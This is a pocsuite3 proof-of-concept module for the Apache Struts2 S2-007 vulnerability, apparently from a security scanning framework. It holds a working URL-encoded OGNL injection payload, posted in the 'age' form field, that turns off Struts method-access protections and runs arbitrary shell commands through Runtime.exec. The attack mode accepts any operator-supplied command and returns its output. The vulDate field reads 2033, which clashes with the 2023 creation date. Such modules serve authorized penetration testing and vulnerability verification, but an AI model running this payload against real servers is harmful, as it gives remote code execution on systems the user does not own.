from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.enums import VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.utils import random_str, get_middle_text


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['knownsec.com']
    vulDate = '2033-11-15'
    createDate = '2023-11-15'
    updateDate = '2023-11-15'
    references = ['https://cwiki.apache.org/confluence/display/WW/S2-007']
    name = 'Apache Struts2 s2-007'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = 'Struts 2.0.0 - Struts 2.2.3'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''S2-007:影响版本Struts 2.0.0 - Struts 2.2.3'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    dockerfile = '''FROM isxiangyang/struts2-all-vul-pocsuite:latest'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('', description="可执行的shell命令")
        return o

    def _verify(self):
        p = self._check()
        if p:
            return self.parse_output(p)

    def _check(self):
        result = {}
        hash_str = random_str(10)
        exec_payload = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"
        headers = {}
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers["Connection"] = "close"
        command = [
            "echo " + hash_str,
            "cmd.exe /c echo " + hash_str
        ]
        for cmd in command:
            data = "age={exp}"
            data = data.format(exp=exec_payload.format(cmd=quote(cmd)))
            html = requests.post(self.url, data=data, headers=headers).text

            if hash_str in html:
                result["VerifyInfo"] = {
                    "URL": self.url,
                    "PAYLOAD": data
                }

                return result
        return False

    def _attack(self):
        p = self._check()
        result = {}
        if p:
            exec_payload = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"
            headers = {}
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers["Connection"] = "close"
            command = self.get_option("command")
            data = "age={exp}"
            data = data.format(exp=exec_payload.format(cmd=quote(command)))
            html = requests.post(self.url, data=data, headers=headers).text

            exec_res = get_middle_text(html, "\"age\" value=\"", "\n")
            result["VerifyInfo"] = {
                "URL": self.url,
                "PAYLOAD": data,
                "result": exec_res
            }
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
